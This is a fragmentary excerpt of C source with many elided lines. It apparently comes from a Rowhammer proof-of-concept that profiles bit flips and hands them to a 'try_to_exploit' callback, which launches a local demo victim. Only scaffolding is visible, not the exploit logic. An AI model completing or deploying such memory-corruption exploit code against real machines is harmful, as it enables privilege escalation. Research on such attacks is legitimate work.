...
// #define START_SIGNAL "start_signal.pipe"
static int VERBOSITY = V_ERR;
extern struct hammeringDataStruct data_for_hammering;
char* buffer_to_unmap;
int buffer_to_unmap_size = 1000 * 4096;
...
static void print_entry(struct AddrEntry e, FILE *f, const char *trail)
{
	...
	if (VERBOSITY & V_DEBUG) {
		...
		fprintf(f, "\tphys_addr = %lld\t", get_physical_pfn(e.virtp));
	}
	if (trail) {
		fputs(trail, f);
	}
...
void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, void* arg)
{
	...
	if(pid_to_signal == 0){
		execl("./demo_victim", "./demo_victim", NULL);
		perror("execl");
		exit(0);
	}
	// ************************************
...
{
	buffer_to_unmap = mmap(NULL, buffer_to_unmap_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, 0, 0);
	int r;
	void *buf;
	FILE *outf = stdout;
	char *msys_str;
	...
	pc = (struct ProfileCtx) {
		...
		.bitflip_report_fn = try_to_exploit,
